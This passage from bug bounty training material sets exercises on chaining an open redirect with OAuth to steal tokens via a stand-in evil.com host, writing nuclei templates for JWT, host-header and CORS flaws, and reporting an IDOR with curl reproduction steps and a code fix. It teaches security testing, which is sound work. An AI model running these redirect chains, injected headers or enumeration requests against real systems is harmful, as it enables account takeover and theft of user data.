- Respects rate limits (no more than 100 requests/second per target)
- Produces deduplicated, actionable output
- Includes timing and resource usage metrics

---

### Exercise 2: Chain Three Low-Severity Findings into a Critical Report

**Objective:** Given three simulated low-severity findings, construct a chain that demonstrates critical impact and write a professional bug bounty report.

**Scenario:**

```
Finding 1 (Informational): User Enumeration
- Endpoint: POST /api/auth/check-email
- Behavior: Returns {"exists": true} for registered emails
- Individually: informational, no direct harm

Finding 2 (Low): Open Redirect
- Endpoint: GET /redirect?url=https://evil.com
- Behavior: Redirects to any URL without validation
- Individually: Low severity, limited phishing impact

Finding 3 (Low): OAuth redirect_uri Accepts Subdomain Wildcard
- Endpoint: GET /oauth/authorize?redirect_uri=https://*.target.com/callback
- Behavior: Any subdomain of target.com accepted as redirect_uri
- Individually: Low, requires control of a subdomain
```

**Task:**

```markdown
# Construct the attack chain:

## Chain Logic:
1. Use Finding 1 to confirm victim's email is registered
2. Use Finding 3 with Finding 2:
   - Set redirect_uri to: https://target.com/redirect?url=https://evil.com/steal
   - This is accepted because /redirect is on *.target.com
3. Victim clicks OAuth link → authenticates → token redirected to attacker

## Combined Impact:
- Any registered user's OAuth token can be stolen
- Attacker gains full account access
- No victim interaction beyond clicking a single link

## Write the full report:
- Title: [Your title here]
- CVSS: [Calculate combined severity]
- Steps: [Detailed reproduction chain]
- Impact: [Quantified real-world impact]
- PoC: [Working proof of concept]
- Remediation: [Fix for each component]
```

**Expected Deliverable:**

A complete, submission-ready bug bounty report that:
- Clearly explains each component vulnerability
- Demonstrates the chain with exact HTTP requests
- Provides a working PoC (HTML page that executes the chain)
- Scores CVSS based on combined impact (should be High or Critical)
- Offers remediation for each link in the chain

---

### Exercise 3: Write Five Custom Nuclei Templates

**Objective:** Create production-ready nuclei templates for common vulnerabilities that scanners miss.

```yaml
# Template 1: Detect JWT tokens with "none" algorithm acceptance
# Requirements:
# - Craft a JWT with alg: "none"
# - Send to common auth endpoints
# - Detect successful authentication

id: jwt-none-algorithm

info:
  name: JWT None Algorithm Bypass
  author: researcher
  severity: critical
  tags: jwt,auth,bypass

# YOUR IMPLEMENTATION HERE:
# - Modify provided JWT to use alg: none
# - Strip signature
# - Test against /api/profile, /api/user, /api/me
# - Match on 200 status with user data in response
```

```yaml
# Template 2: GraphQL Introspection Enabled
# Requirements:
# - Test multiple GraphQL endpoints
# - Send introspection query
# - Extract schema information

id: graphql-introspection-enabled

info:
  name: GraphQL Introspection Enabled
  author: researcher
  severity: medium
  tags: graphql,exposure

# YOUR IMPLEMENTATION HERE:
# - Test /graphql, /gql, /api/graphql
# - Send { __schema { types { name } } }
# - Match on __schema in response
# - Extract type names as additional info
```

```yaml
# Template 3: Sensitive Data in Error Messages
# Requirements:
# - Trigger error conditions
# - Detect stack traces, SQL errors, internal paths
# - Rate severity based on information disclosed

id: verbose-error-messages

info:
  name: Verbose Error Messages with Sensitive Data
  author: researcher
  severity: low
  tags: exposure,misconfiguration

# YOUR IMPLEMENTATION HERE:
# - Send malformed inputs to trigger errors
# - Match on: stack traces, file paths, SQL syntax, version numbers
# - Extract leaked information
```

```yaml
# Template 4: Host Header Injection in Password Reset
# Requirements:
# - Inject evil host in password reset request
# - Detect if application uses injected host in reset URL

id: host-header-password-reset

info:
  name: Host Header Injection in Password Reset
  author: researcher
  severity: high
  tags: host-header,ato

# YOUR IMPLEMENTATION HERE:
# - POST to /forgot-password, /reset-password, /api/auth/reset
# - Inject Host: evil.com and X-Forwarded-Host: evil.com
# - Detect success response (token sent to email with evil.com domain)
# - Note: full verification requires email access (collaborator)
```

```yaml
# Template 5: CORS Misconfiguration with Credential Access
# Requirements:
# - Test reflected origin
# - Test null origin
# - Verify Access-Control-Allow-Credentials: true

id: cors-misconfiguration-credentials

info:
  name: CORS Misconfiguration Allowing Credential Theft
  author: researcher
  severity: high
  tags: cors,misconfiguration

# YOUR IMPLEMENTATION HERE:
# - Send requests with Origin: https://evil.com
# - Send requests with Origin: null
# - Check for reflected ACAO + ACAC: true
# - Verify the endpoint returns sensitive data
```

**Evaluation Criteria:**

- Templates follow nuclei best practices (proper matchers, extractors)
- False positive rate is minimized (use matcher-condition: and)
- Templates are reusable across different targets
- Severity ratings are justified
- Each template includes proper metadata (tags, references, description)

---

### Exercise 4: Complete Bug Bounty Report for an IDOR Finding

**Objective:** Write a complete, submission-ready bug bounty report for an IDOR vulnerability, including all evidence and professional communication.

**Simulated Finding:**

```
Vulnerable Application: target.com (e-commerce platform)
Vulnerable Endpoint: GET /api/v2/orders/{order_id}
Authentication: Bearer token (JWT)
Issue: Any authenticated user can access any order by changing the order_id parameter

Observed Behavior:
- User A (order ID: ORD-10001) can access User B's order (ORD-10002)
- Response includes: full name, shipping address, phone, email, items, payment last 4 digits
- No rate limiting on the endpoint
- Order IDs are sequential (predictable)
- Estimated total users: 250,000+ (from /api/stats public endpoint)
```

**Write the Complete Report:**

```markdown
# Your report must include:

## 1. Title (impactful, specific)

## 2. Vulnerability Summary (2-3 sentences)

## 3. Severity Assessment
- CVSS 3.1 vector string with score
- Justification for each metric

## 4. Affected Asset
- Exact endpoint URL
- HTTP method
- Required authentication level

## 5. Reproduction Steps
- Step-by-step with exact HTTP requests
- Include actual (redacted) request/response samples
- Include curl commands for easy reproduction

Example:
```bash
# Step 1: Authenticate as attacker
curl -s -X POST https://target.com/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"TestPass123!"}' \
  | jq .token

# Step 2: Access own order (legitimate)
curl -s https://target.com/api/v2/orders/ORD-10001 \
  -H "Authorization: Bearer ATTACKER_JWT" | jq .

# Step 3: Access victim's order (IDOR)
curl -s https://target.com/api/v2/orders/ORD-10002 \
  -H "Authorization: Bearer ATTACKER_JWT" | jq .
# Expected: 403 Forbidden
# Actual: 200 OK with full order details
```

## 6. Impact Assessment
- Data exposed per order
- Total addressable orders (enumeration)
- Real-world attack scenario
- Affected user count estimation
- Regulatory implications (PCI-DSS for payment data, GDPR for EU users)

## 7. Proof of Concept
- Screenshots (redacted PII)
- HTTP request/response pairs
- Script for automated enumeration (redacted, limited scope)

## 8. Remediation Recommendations
- Short-term: server-side authorization check
- Long-term: non-sequential IDs (UUIDs), rate limiting
- Code-level fix suggestion:

```python
# Before (vulnerable):
@app.route('/api/v2/orders/<order_id>')
@require_auth
def get_order(order_id):
    return Order.query.get(order_id).to_dict()

# After (fixed):
@app.route('/api/v2/orders/<order_id>')
@require_auth
def get_order(order_id):
    order = Order.query.get(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return order.to_dict()
```

## 9. References
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP API Security Top 10: API1:2023 Broken Object Level Authorization
- OWASP Testing Guide: OTG-AUTHZ-004

## 10. Timeline
- Discovery date
- Submission date
- Any additional context
```

**Evaluation Criteria:**

- Report is clear enough for a junior developer to reproduce
- Impact is quantified, not theoretical
- CVSS is properly calculated and justified
- Remediation is specific and actionable
- Professional tone throughout
- No sensitive data exposed in report (proper redaction)
- References appropriate standards (CWE, OWASP)

---

## Appendix: Essential Tool Installation

```bash
# ProjectDiscovery suite
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/notify/cmd/notify@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# Recon tools
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/d3mondev/puredns/v2@latest
go install -v github.com/hakluke/hakrawler@latest

# Content discovery
go install -v github.com/ffuf/ffuf/v2@latest
cargo install feroxbuster

# Parameter discovery
pip3 install arjun

# Secret scanning
go install github.com/trufflesecurity/trufflehog/v3@latest
go install github.com/gitleaks/gitleaks/v8/cmd/gitleaks@latest

# Mobile testing
pip3 install frida-tools objection

# Install nuclei templates
nuclei -update-templates
```

---

## Appendix: Bug Bounty Methodology Checklist

```
PRE-ENGAGEMENT:
□ Read program policy completely
□ Understand scope (in-scope and out-of-scope)
□ Note excluded vulnerability types
□ Check for safe harbor clause
□ Set up dedicated testing environment
□ Configure proxy (Burp/Caido) and tools

RECONNAISSANCE:
□ Subdomain enumeration (4+ sources)
□ DNS resolution and wildcard filtering
□ HTTP probing on all resolved hosts
□ Port scanning (top ports or full range)
□ Technology fingerprinting
□ Content discovery with appropriate wordlists
□ JavaScript file analysis
□ GitHub/source code recon
□ Historical URL mining (Wayback, GAU)
□ Certificate transparency monitoring

VULNERABILITY DISCOVERY:
□ Authentication testing (JWT, OAuth, SAML)
□ Authorization testing (IDOR, BOLA)
□ Parameter discovery and injection testing
□ Business logic analysis
□ File upload testing
□ SSRF testing on URL-consuming features
□ Template injection testing
□ API-specific tests (mass assignment, GraphQL)
□ Rate limiting assessment
□ CORS configuration testing
□ Cache behavior analysis
□ Request smuggling probes
□ Subdomain takeover checks

EXPLOITATION:
□ Verify impact beyond theoretical
□ Chain findings for maximum severity
□ Document full exploitation path
□ Limit testing to minimum necessary PoC
□ Do not access real user data beyond proof

REPORTING:
□ Clear, descriptive title
□ Complete reproduction steps
□ Evidence (screenshots, video, curl commands)
□ CVSS score with justification
□ Impact assessment (quantified)
□ Remediation recommendations
□ Professional tone and formatting

POST-SUBMISSION:
□ Respond to triager questions promptly
□ Provide additional evidence if requested
□ Maintain professional communication
□ Track report status
□ Request mediation if disagreement persists
```
